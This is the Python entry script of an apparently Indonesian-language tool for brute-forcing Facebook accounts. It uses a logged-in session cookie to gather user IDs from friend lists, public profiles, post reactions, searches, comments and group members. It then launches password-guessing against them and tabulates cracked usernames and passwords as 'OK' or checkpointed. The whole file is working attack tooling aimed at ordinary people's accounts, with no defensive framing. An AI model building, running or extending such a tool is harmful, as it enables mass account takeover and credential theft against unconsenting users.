from src.user import User
from src.dump import Dump
from src.brute import Brute
from src.app.cli import prints
from prettytable import PrettyTable
import os
import json


user = User()
brute = Brute()

def main():
    print('  ( Bruteforce Facebook )')

    # cek cookie
    if 'cookie' in os.listdir('.'):
        cookie = open('cookie', 'r').read().replace('\n', '')
    else:
        cookie = input('  (?) Cookie: ')

    user.login(cookie)
    dump = Dump(user.cookie)

    os.system('clear')
    prints('<c>BRUTEFORCE FACEBOOK\n', middle=True)
    prints('(USER): '+user.username)
    prints('-'*50)
    prints('(1) Bruteforce dari Daftar Teman')
    prints('(2) Bruteforce dari Publik')
    prints('(3) Bruteforce dari React Postingan')
    prints('(4) Bruteforce dari Hasil Pencarian')
    prints('(5) Bruteforce dari Komentar Postingan')
    prints('(6) Bruteforce dari Anggota Grub')
    prints('(B) Mulai meretas')
    prints('(R) Lihat Hasil')
    print()

    pilihan = input('  (Pilihan): ')
    print()
    if pilihan == '1':
        dump.from_friendlist()
    elif pilihan == '2':
        id = input('  (?) Masukan id target: ')
        dump.from_friendlist(id)
    elif pilihan.lower() == 'b':
        d = os.listdir('dump')
        for x in d:
            jumlah_id = json.loads(open('dump/'+x, 'r').read())['data']
            jumlah_id = len(jumlah_id)
            if jumlah_id == 0:
                prints(f'({str(d.index(x))}) {x}     <r>[Dihapus]')
                os.remove('dump/'+x)
            else:
                prints(f'({str(d.index(x))}) {x} <g>[{jumlah_id}]')
        print()
        p = int(input('  (Pilihan): '))
        fn = d[p]
        target = json.loads(open('dump/'+fn, 'r').read())
        brute.set_target = target['data']
        brute.start()
        brute.save(fn)
    elif pilihan.lower() == 'r':
        listdir = os.listdir('./result')[::-1]
        for file in listdir:
            f = open('./result/'+file, 'r')
            text = f.read()
            data = json.loads(text)
            prints(f"<c>({listdir.index(file)+1})<n> {file} <g>[{len(data['ok'])}] <y>[{len(data['cp'])}]")

        print()
        i = int(input('  (Pilihan): '))
        print()

        columns = ['username', 'password', 'status']
        table = PrettyTable(columns)
        table.horizontal_char = '─'
        table.vertical_char = '│'
        table.title = listdir[i-1]
        with open('./result/'+listdir[i-1], 'r') as f:
            text = f.read()
            data = json.loads(text)
            for ok in data['ok']:
                table.add_row([ok[0], ok[1], 'OK'])
            for cp in data['cp']:
                table.add_row([cp[0], cp[1], 'CP'])
            print(table)


if __name__ == '__main__':
    main()
